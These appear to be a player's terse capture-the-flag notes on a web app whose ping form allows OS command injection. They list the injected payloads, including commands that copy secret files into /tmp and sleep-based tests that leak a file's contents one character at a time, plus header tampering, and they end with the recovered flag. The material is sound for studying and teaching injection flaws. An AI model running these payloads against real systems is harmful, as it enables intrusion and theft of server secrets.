
# 1 webapp nature

ports 80,4444,4445

web has one input = website or ip to send ping
> host is alive
> host is not alive
> input error

---

# 2 ci syntax

```
8.8.8.8 | payload
```

```
sleep 5
> host alive + wait

cp /var/www/html/secret* /tmp/secret.txt
> host alive

cp /tmp/secret.txt /var/www/html/output.txt
> input error
```

likely `no write permission` at `/var/www/html/`

---

# 3 found port 443

`nmap` shows port opened, but cannot tell service

`https:///web` returns 'site can't be reached 

`curl` got 'reset by peer'

not sure what it does, but might have to do with escalate

---

# 4 tests

header tamper is ok
```
Origin, Referer >>> https://web
```

keep header tamper + the following to confirm /tmp/t.txt exists and it contains 32 characters
```
8.8.8.8 | cat /var/www/html/secret* >> /tmp/t.txt

8.8.8.8 | if [ -f /tmp/t.txt ]; then sleep 5; fi

8.8.8.8 | if [ $(wc -c < /tmp/t.txt) -ge 32 ]; then sleep 5; fi
```

bf each character from last position (since likely it is })
```
8.8.8.8 | if [ "$(cat /tmp/t.txt | cut -c20)" = "}" ]; then sleep 10; fi
```

fuzz
```
16chars
web{gSdKZSFANc}
```

---

# end